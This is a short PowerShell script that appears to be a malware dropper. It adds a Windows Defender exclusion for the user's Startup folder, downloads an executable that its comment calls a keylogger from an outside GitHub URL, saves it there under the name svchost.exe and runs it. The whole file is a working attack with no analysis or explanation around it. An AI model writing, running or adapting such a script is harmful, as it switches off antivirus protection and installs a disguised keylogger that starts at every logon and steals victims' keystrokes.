#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
#Download keylogger.exe
(New-Object Net.Webclient).DownloadFile('https://github.com/isppilslowispp/Aslclripysa/raw/main/yeklgorr.exe',"$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe")
Start-Sleep -Seconds 6
Set-Location "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
./svchost.exe
